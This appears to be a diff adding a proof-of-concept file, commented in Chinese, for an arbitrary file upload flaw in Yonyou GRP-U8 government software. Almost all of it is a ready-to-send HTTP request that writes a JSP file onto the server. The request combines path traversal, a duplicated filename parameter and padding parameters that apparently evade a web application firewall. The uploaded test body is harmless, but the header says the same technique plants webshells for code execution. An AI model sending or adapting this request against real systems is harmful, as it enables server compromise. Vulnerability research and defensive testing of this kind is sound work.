@@ -1,0 +1,16 @@
+# 用友GRP-U8 UploadFileData任意文件上传漏洞
+# 用友GRP-U8是一款政务管理软件，在UploadFileData功能中存在任意文件上传漏洞。攻击者可构造恶意请求上传webshell，执行任意代码，控制服务器。
+POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg&acid=80000899&bid=hd_tag_m8mv24ej HTTP/1.1
+Host: www.swaf.com
+Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
+RM-PRO-BusinessID: hd_tag_m8mv24ej
+RM-PRO-Token: 0172d9536d380d83216f048de56a18aa
+RM-PRO-Time: 1742808378075
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=------WebKitFormBoundary92pUawKc
+
+------WebKitFormBoundary92pUawKc
+Content-Disposition: form-data; name="myFile";filename="test.jpg"
+
+<% out.println("Hello World!");%>
+------WebKitFormBoundary92pUawKc--
